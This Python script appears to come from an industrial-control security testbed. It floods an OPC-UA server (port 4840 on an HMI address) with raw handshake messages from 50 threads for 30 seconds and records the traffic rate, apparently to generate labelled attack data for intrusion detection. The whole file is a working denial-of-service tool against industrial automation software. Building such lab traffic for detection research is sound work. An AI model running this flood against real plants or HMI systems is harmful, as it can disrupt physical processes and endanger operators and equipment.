#!/usr/bin/env python3
"""
tests/test_opcua_dos.py
OPC-UA Connection Flood DoS — target opcua_sim_server.

Chạy: python tests/test_opcua_dos.py
"""

import sys
import os
import socket
import struct
import time
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

THREADS = 50
DURATION = 30


def build_hello(host, port):
    endpoint = f"opc.tcp://{host}:{port}".encode()
    ep_len = len(endpoint)
    msg_size = 28 + ep_len
    return (
        b'HEL' + b'F' +
        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
        struct.pack('<I', ep_len) + endpoint
    )


def flood_worker(host, port, hello, results, lock, end_time):
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.send(hello)
            s.close()
            with lock:
                results["success"] += 1
        except Exception:
            with lock:
                results["failed"] += 1


def main():
    host = HMI_IP
    port = 4840

    print(f"\n{B}[TEST] OPCUA_DOS_FLOOD{X}")
    info(f"Target: {host}:{port}  Threads: {THREADS}  Duration: {DURATION}s")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    hello = build_hello(host, port)
    results = {"success": 0, "failed": 0}
    lock = threading.Lock()
    end_time = time.time() + DURATION

    try:
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=flood_worker,
                                 args=(host, port, hello, results, lock, end_time))
            t.daemon = True
            threads.append(t)
            t.start()

        start = time.time()
        while time.time() < end_time:
            time.sleep(1)
            elapsed = int(time.time() - start)
            rate = results["success"] // max(1, elapsed)
            if elapsed % 5 == 0:
                info(f"  [{elapsed:3d}s] sent={results['success']:5d} | failed={results['failed']:4d} | rate={rate}/s")

        for t in threads:
            t.join(timeout=3)

        rate = results["success"] // max(1, DURATION)
        observable.append(f"OPC-UA DoS: {results['success']} connects trong {DURATION}s ({rate}/s)")
        notes.append(f"Total: {results['success']} sent | {results['failed']} failed")
        notes.append("CIC: extremely high Flow Packets/s")

    except KeyboardInterrupt:
        info("Stopped by user")
    except Exception as e:
        error = str(e)
        fail(str(e))

    success = results["success"] > 0
    print_result("OPCUA_DOS_FLOOD", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
